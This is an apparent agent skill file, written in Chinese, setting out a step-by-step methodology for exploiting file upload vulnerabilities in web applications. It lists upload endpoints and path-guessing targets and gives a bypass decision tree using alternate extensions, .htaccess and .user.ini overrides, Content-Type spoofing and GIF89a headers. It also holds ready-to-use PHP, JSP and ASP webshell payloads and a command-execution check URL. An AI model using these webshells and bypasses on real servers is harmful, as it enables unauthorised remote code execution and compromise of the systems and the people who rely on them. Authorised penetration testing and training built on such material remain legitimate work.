---
name: file-upload-methodology
description: "任意文件上传的检测、绕过和利用。当目标有上传功能(头像、附件、导入)、multipart表单、文件管理接口时使用。包含扩展名/Content-Type/Magic Bytes三层绕过、.htaccess覆盖、.user.ini+auto_prepend_file、图片马二次渲染绕过、ZIP解压利用、上传路径猜解方法"
metadata:
  tags: "arbitrary_file_upload,file upload,webshell,bypass,path-traversal,rce,upload,multipart,Content-Type绕过,双扩展名,MIME,文件上传,avatar,头像,attachment,附件,import,导入,图片上传,image upload"
  category: "exploit"
---

# 文件上传漏洞execution-framework

## ⛔ 深入参考（必读）

- 需要扩展名/Content-Type/Magic Bytes 绕过详解、路径穿越、.htaccess 覆盖、.user.ini 利用、图片马二次渲染绕过、ZIP 解压利用 → [references/upload-bypass.md](references/upload-bypass.md)

---

## Phase 0: 上传功能发现与分析（最先执行！）

1. 寻找 `<form enctype="multipart/form-data">` 或 `<input type="file">`
2. 常见端点：`/upload`, `/api/upload`, `/avatar`, `/import`
3. **关键收集**：允许的文件类型、上传后存储路径、服务器技术栈（PHP/Java/Python）

**陷阱**：前端 JS 验证可以直接绕过，真正的限制在后端。

## Phase 1: 基础上传测试

1. 先上传正常文件（.txt）确认功能正常，**记录返回的文件路径**
2. 访问上传的文件 URL — 确认可访问
3. 上传 .php 文件，观察是否被拒绝

**路径猜解**：`/uploads/`, `/upload/`, `/files/`, `/static/uploads/`, `/images/`

## Phase 2: 绕过决策树

```
上传被拒绝？
├─ 扩展名限制（黑名单）→ .phtml/.php5/大小写/.php./双写 → [references/upload-bypass.md](references/upload-bypass.md)
├─ 扩展名限制（白名单）→ .htaccess 覆盖（Apache）或 .user.ini（通用）→ [references/upload-bypass.md](references/upload-bypass.md)
├─ Content-Type 限制 → 改为 image/jpeg
├─ 文件头检查 → GIF89a + webshell
├─ 二次渲染检查 → 图片马（GIF 优先）→ [references/upload-bypass.md](references/upload-bypass.md)
└─ 三层都限制 → 组合绕过：扩展名 + Content-Type + 文件头
```

## Phase 3: Webshell Payload

**PHP**（最常见）：
```php
<?php system($_GET['cmd']); ?>
```
精简版（绕过关键字）：`<?=`$_GET[1]`?>`

**JSP**: `<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>`
**ASP**: `<%eval request("cmd")%>`

### 上传后验证
```
http://target/uploads/shell.php?cmd=id
```
**陷阱**：访问 .php 返回源代码 → 该目录禁止执行，需要路径穿越或 .htaccess。

## 注意事项
- **上传成功 ≠ 可利用**：必须访问验证执行
- **服务端可能 hash 重命名**：从响应中获取新文件名
- **记录每次尝试的扩展名和响应**：快速排除无效绕过

## .htaccess 攻击
- 两步法：先上传 .htaccess 配置 PHP 解析规则，再上传 shell.jpg

## 上传≠执行
- 上传成功不代表能利用（上传≠执行），需要确认文件可被访问和解析
- 配合文件包含（LFI）等其他漏洞执行上传的 webshell
